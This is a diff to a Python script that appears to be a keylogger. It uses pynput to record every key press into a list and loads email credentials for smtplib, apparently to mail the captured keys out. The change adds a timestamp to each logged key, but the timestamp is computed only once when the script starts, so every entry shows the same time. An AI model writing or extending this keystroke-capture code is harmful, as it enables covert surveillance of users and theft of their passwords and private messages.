@@ -2,11 +2,14 @@ import smtplib
 import os
 from dotenv import load_dotenv
 from pynput.keyboard import Key, Listener
+from datetime import datetime
+
 load_dotenv()
 
+dt = datetime.now()
+ts = datetime.timestamp(dt)
 EMAIL_ADDRESS = os.environ.get("emailaddress")
 PASSWORD = os.environ.get("password")
-
 
 count = 0
 keys = []
@@ -17,7 +20,7 @@ def on_press(key):
 
     keys.append(key)
     count += 1
-    print("{0} pressed".format(key))
+    print("{0} pressed".format(key), dt)
 
     if count >= 1:
         count = 0
